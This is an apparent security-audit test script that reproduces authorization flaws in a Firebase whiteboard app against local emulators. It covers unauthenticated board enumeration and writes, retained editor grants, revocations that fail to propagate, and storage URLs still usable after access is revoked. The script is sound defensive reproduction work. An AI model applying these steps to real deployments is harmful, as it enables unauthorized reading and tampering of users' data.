// Vulnerability reproductions for the October 2026 audit. Local emulators only.
// These assert the vulnerable behavior; invert expectations when fixing each issue.
import assert from 'node:assert/strict'
import { createRequire } from 'node:module'
const webRequire = createRequire(new URL('../apps/whiteboard/package.json', import.meta.url))
const adminRequire = createRequire(new URL('../functions/package.json', import.meta.url))
const { initializeApp, deleteApp } = webRequire('firebase/app')
const { getAuth, connectAuthEmulator, signInAnonymously, createUserWithEmailAndPassword } = webRequire('firebase/auth')
const { getFirestore, connectFirestoreEmulator, doc, getDoc, getDocs, collection, query, where, setDoc, updateDoc } = webRequire('firebase/firestore')
const { getStorage, connectStorageEmulator, ref: sref, uploadBytes, getDownloadURL } = webRequire('firebase/storage')
const { initializeApp: initAdmin, deleteApp: deleteAdmin } = adminRequire('firebase-admin/app')
const { getFirestore: adminFirestore } = adminRequire('firebase-admin/firestore')
const { getDatabase: adminDatabase } = adminRequire('firebase-admin/database')

const projectId = 'demo-whiteboard-security'
process.env.FIRESTORE_EMULATOR_HOST = '127.0.0.1:18080'
process.env.FIREBASE_DATABASE_EMULATOR_HOST = '127.0.0.1:19000'
process.env.GCLOUD_PROJECT = projectId
process.env.FIREBASE_CONFIG = JSON.stringify({ projectId, databaseURL: `http://127.0.0.1:19000?ns=${projectId}` })
process.env.RTDB_FUNCTION_REGION = 'us-central1'
process.env.FIRESTORE_FUNCTION_REGION = 'us-central1'
process.env.SYNC_ACCESS_FUNCTION_REGION = 'us-central1'
const admin = initAdmin({ projectId, databaseURL: `http://127.0.0.1:19000?ns=${projectId}` }, 'audit-fixtures')
const handlers = await import('../functions/lib/index.js')
const adb = adminFirestore(admin)
const rtdb = adminDatabase(admin)
const apps = []
function client(name) {
  const app = initializeApp({ projectId, apiKey: 'emulator-only', storageBucket: `${projectId}.appspot.com` }, name)
  apps.push(app)
  const auth = getAuth(app)
  connectAuthEmulator(auth, 'http://127.0.0.1:19099', { disableWarnings: true })
  const db = getFirestore(app)
  connectFirestoreEmulator(db, '127.0.0.1', 18080)
  const storage = getStorage(app)
  connectStorageEmulator(storage, '127.0.0.1', 19199)
  return { auth, db, storage }
}
const board = (access = 'restricted', role = 'viewer', extra = {}) => ({
  ownerId: 'fixture-owner', boardName: 'Fixture secret', ownerEmail: 'owner@example.test',
  generalAccess: access, generalRole: role, invitedEmails: [], collaborators: {},
  scene: { elements: [], appState: {} }, ...extra,
})
async function rtdbRequest(path, user, method = 'GET', body) {
  const token = await user.getIdToken()
  return fetch(`http://127.0.0.1:19000/${path}.json?ns=${projectId}&auth=${encodeURIComponent(token)}`, {
    method, ...(body === undefined ? {} : { body: JSON.stringify(body) }),
  })
}
async function run() {
  const anonymous = client('anonymous')
  const outsider = client('outsider')
  const fakeInvitee = client('fake-invitee')
  const guest = (await signInAnonymously(anonymous.auth)).user
  await signInAnonymously(outsider.auth)
  const suffix = Date.now()
  const email = `unverified-${suffix}@example.test`
  const fake = (await createUserWithEmailAndPassword(fakeInvitee.auth, email, 'emulator-fixture-password')).user
  assert.equal(fake.emailVerified, false)
  await adb.doc('boardShares/link-view').set(board('anyone_with_link'))
  await adb.doc('boardShares/link-edit').set(board('anyone_with_link', 'editor'))
  await adb.doc('boardShares/private').set(board())
  await adb.doc('boardShares/invited').set(board('restricted', 'viewer', {
    invitedEmails: [email], collaborators: { [email]: { role: 'editor' } },
  }))
  const noAuth = client('no-auth')
  const discovered = await getDocs(query(collection(noAuth.db, 'boardShares'), where('generalAccess', '==', 'anyone_with_link')))
  assert.ok(discovered.docs.some((d) => d.id === 'link-view'))
  assert.ok(discovered.docs.some((d) => d.id === 'link-edit'))
  assert.equal(discovered.docs[0].data().ownerEmail, 'owner@example.test')
  console.log('CONFIRMED: unauthenticated query enumerates link boards and owner email')
  await updateDoc(doc(noAuth.db, 'boardShares/link-edit'), { boardName: 'Unauthenticated overwrite' })
  console.log('CONFIRMED: unauthenticated caller writes public-editor Firestore document')
  await assert.rejects(getDoc(doc(outsider.db, 'boardShares/private')), /permission|insufficient/i)
  await assert.rejects(updateDoc(doc(anonymous.db, 'boardShares/link-view'), { boardName: 'denied' }), /permission|insufficient/i)
  await assert.rejects(updateDoc(doc(anonymous.db, 'boardShares/link-edit'), { ownerId: guest.uid }), /permission|insufficient/i)
  console.log('CONTROL: restricted reads, viewer scene writes, and non-owner ACL changes denied')
  await getDoc(doc(fakeInvitee.db, 'boardShares/invited'))
  await updateDoc(doc(fakeInvitee.db, 'boardShares/invited'), { boardName: 'Unverified invitee write' })
  console.log('CONFIRMED: unverified email identity reads and edits restricted invited board (provider-dependent)')
  const otherEmail = 'remaining@example.test'
  await setDoc(doc(anonymous.db, 'boardShares/removal'), board('restricted', 'viewer', {
    ownerId: guest.uid, invitedEmails: [email, otherEmail],
    collaborators: { [email]: { role: 'editor' }, [otherEmail]: { role: 'viewer' } },
  }))
  // Matches saveShareConfig's setDoc(..., { merge: true }) after removing one invitee.
  await setDoc(doc(anonymous.db, 'boardShares/removal'), {
    invitedEmails: [otherEmail], collaborators: { [otherEmail]: { role: 'viewer' } },
  }, { merge: true })
  assert.equal((await adb.doc('boardShares/removal').get()).data().collaborators[email].role, 'editor')
  await assert.rejects(getDoc(doc(fakeInvitee.db, 'boardShares/removal')), /permission|insufficient/i)
  await updateDoc(doc(fakeInvitee.db, 'boardShares/removal'), { boardName: 'Removed editor still writes' })
  console.log('CONFIRMED: removing one of multiple collaborators hides read access but retains editor write grant')
  assert.throws(() => rtdb.ref('boardAccess/bad-email').set({ readersByEmail: { 'friend@example.test': true } }), /invalid key/i)
  console.log('CONFIRMED: access mirror rejects ordinary email map keys')
  await rtdb.ref('boardAccess/link-edit').set({ ownerId: 'fixture-owner', publicRead: true, publicWrite: true })
  await adb.doc('boardShares/link-edit').update({ generalAccess: 'restricted', invitedEmails: ['friend@example.test'] })
  assert.throws(() => rtdb.ref('boardAccess/link-edit').set({ ownerId: 'fixture-owner', publicRead: false, publicWrite: false, readersByEmail: { 'friend@example.test': true } }), /invalid key/i)
  const delta = { id: 'e1', version: 1, versionNonce: 1, lastModifiedBy: guest.uid, data: JSON.stringify({ id: 'e1', type: 'rectangle', x: 0, y: 0, width: 1, height: 1 }) }
  assert.equal((await rtdbRequest('boards/link-edit/elements/e1', guest, 'PUT', delta)).status, 200)
  assert.equal((await rtdbRequest('boards/link-edit/elements', guest)).status, 200)
  console.log('CONFIRMED: rejected revocation mirror leaves old public RTDB read/write active')
  const currentRestricted = board()
  await adb.doc('boardShares/reordered').set(currentRestricted)
  const event = (config) => ({ params: { boardId: 'reordered' }, data: { after: { exists: true, data: () => config } } })
  await handlers.mirrorBoardAccessToRtdb.run(event(currentRestricted))
  await handlers.mirrorBoardAccessToRtdb.run(event(board('anyone_with_link', 'editor')))
  assert.equal((await rtdb.ref('boardAccess/reordered/publicWrite').get()).val(), true)
  assert.equal((await adb.doc('boardShares/reordered').get()).data().generalAccess, 'restricted')
  console.log('CONFIRMED: delayed old Firestore event restores public RTDB ACL for currently restricted board')
  await rtdb.ref('boardAccess/link-view').set({ ownerId: 'fixture-owner', publicRead: true, publicWrite: false })
  for (let i = 0; i < 11; i++) {
    const sessionId = `fake-${i}`
    const p = { userId: guest.uid, sessionId, displayName: 'Fake user', color: '#000', joinedAt: 0, lastSeen: 1 }
    assert.equal((await rtdbRequest(`presence/link-view/${sessionId}`, guest, 'PUT', p)).status, 200)
  }
  console.log('CONFIRMED: one viewer creates 11 early-ranked presence entries')
  assert.equal((await rtdbRequest('presence/link-view/malformed-viewer', guest, 'PUT', {
    userId: guest.uid, sessionId: 'malformed-viewer', displayName: { invalid: true }, color: '#000', lastSeen: 1,
  })).status, 200)
  console.log('CONFIRMED: viewer can publish non-string displayName consumed by UI string methods')
  await rtdb.ref('boardAccess/malformed').set({ ownerId: guest.uid, publicRead: false, publicWrite: false })
  assert.equal((await rtdbRequest('boards/malformed/elements/e1', guest, 'PUT', { ...delta, version: 'invalid', data: '{"id":"other","type":"not-a-real-element"}', extra: 'x'.repeat(300000) })).status, 200)
  console.log('CONFIRMED: RTDB accepts inconsistent element JSON, invalid version, and oversized extra field')
  const knownPrivateId = `unshared-${suffix}`
  await adb.doc(`users/fixture-owner/projects/p1/boards/${knownPrivateId}`).set({ secret: 'owner-private-copy' })
  await setDoc(doc(anonymous.db, 'boardShares', knownPrivateId), board('anyone_with_link', 'editor', { ownerId: guest.uid }))
  console.log('CONFIRMED: outsider claims sharing document for known ID of never-shared private board; no private-copy read')
  // Storage validates the same public-editor branch even without an auth session.
  await adb.doc('boardShares/storage-public').set(board('anyone_with_link', 'editor'))
  const object = sref(noAuth.storage, 'boards/storage-public/snapshots/arbitrary.bin')
  await uploadBytes(object, new Uint8Array(11 * 1024 * 1024), { contentType: 'application/octet-stream' })
  const downloadUrl = await getDownloadURL(object)
  await adb.doc('boardShares/storage-public').update({ generalAccess: 'restricted' })
  assert.equal((await fetch(downloadUrl)).status, 200)
  console.log('CONFIRMED: unauthenticated 11MiB snapshot upload; token URL still downloads after access revocation')
}
try { await run() } finally {
  await Promise.all(apps.map(deleteApp))
  await deleteAdmin(admin)
  await deleteAdmin(adminRequire('firebase-admin/app').getApp())
}
